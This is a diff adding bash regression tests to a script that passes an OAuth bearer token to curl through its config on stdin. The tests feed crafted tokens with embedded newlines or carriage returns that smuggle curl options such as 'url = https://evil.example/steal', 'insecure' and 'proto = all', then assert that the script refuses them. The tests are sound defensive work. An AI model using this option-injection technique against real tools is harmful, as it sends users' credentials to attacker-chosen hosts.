@@ -84,4 +84,65 @@ _run_hostile "FIFO pywal cache"    _h_fifo_pywal
 _run_hostile "3MB usage cache"     _h_big_cache
 _run_hostile "3MB credentials"     _h_big_creds
 _run_hostile "3MB omarchy theme"   _h_big_theme
+# --- a token that tries to inject options into curl's config file ---
+# The bearer reaches curl through `--config -`, and that parser is line
+# oriented: a newline inside a value ends the line and the rest parses as fresh
+# options. `url = https://evil` plus `insecure` is a second transfer carrying
+# the credential to a host the attacker picked, and `proto = all` cancels the
+# --proto '=https' on the command line. Writing the credentials file is exactly
+# the threat this review is about, so the token must be REFUSED, not escaped:
+# what reaches curl must never contain an option line.
+_run_injection() { # <label> <token> [expect-header]
+    local label="$1" token="$2" want_hdr="${3:-no}" home cfg sent
+    home="$(mktemp -d)" || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
+    mkdir -p "$home/.claude" "$home/.cache/claudebar" "$home/bin" \
+        || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
+    cfg="$home/curl-stdin.log"
+    # A curl stub that keeps whatever config it was handed, then fails.
+    { printf '#!/usr/bin/env bash\n'
+      printf 'cat >> %q 2>/dev/null\n' "$cfg"
+      printf 'exit 1\n'
+    } > "$home/bin/curl" && chmod +x "$home/bin/curl" \
+        || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
+    jq -nc --arg t "$token" \
+        '{claudeAiOauth:{accessToken:$t,refreshToken:"y",expiresAt:4102444800000,subscriptionType:"max"}}' \
+        > "$home/.claude/.credentials.json"
+    printf '%s' '{"oauthAccount":{"organizationUuid":"org-test"}}' > "$home/.claude.json"
+    printf '%s' "$GOOD" > "$home/.cache/claudebar/usage.json"
+    # --refresh so the usage fetch runs instead of being served from cache.
+    OUT=$(run_pinned "$home" env CLAUDEBAR_TEST_NET_RETRY_DELAY=0 \
+            CLAUDEBAR_TEST_NET_QUICK_BUDGET=0 CLAUDEBAR_TEST_NET_LONG_BUDGET=0 \
+            timeout 20 "$SCRIPT" --refresh); RC=$?
+    sent=""; [[ -f "$cfg" ]] && sent=$(cat "$cfg")
+    if grep -qiE '^[[:space:]]*url[[:space:]]*=' <<< "$sent"; then
+        _no "$label: no url= reaches curl" "curl config was: $sent"
+    else
+        _ok "$label: no url= reaches curl"
+    fi
+    if grep -qiE '^[[:space:]]*(proto|insecure|output|cert)\b' <<< "$sent"; then
+        _no "$label: no proto/insecure/output reaches curl" "curl config was: $sent"
+    else
+        _ok "$label: no proto/insecure/output reaches curl"
+    fi
+    # The positive control proves the stub really does capture the config, so a
+    # clean result above means "refused", never "the harness saw nothing".
+    if [[ "$want_hdr" == "yes" ]]; then
+        grep -q 'Authorization: Bearer' <<< "$sent" \
+            && _ok "$label: bearer header still sent" \
+            || _no "$label: bearer header still sent" "config was: $sent"
+    fi
+    assert_exit0 "$label: exit 0"
+    assert_json_valid "$label: valid JSON"
+    rm -rf "$home"
+}
+
+_run_injection "clean token" 'sk-ant-oat01-AbC._~+/=-' yes
+_run_injection "token with LF + url/proto" 'abc"
+url = https://evil.example/steal
+insecure
+proto = all
+header = "X: y'
+_run_injection "token with CR"        $'abc\rurl = https://evil.example'
+_run_injection "token with a quote"   'abc"def'
+_run_injection "token with backslash" 'abc\def'
 finish
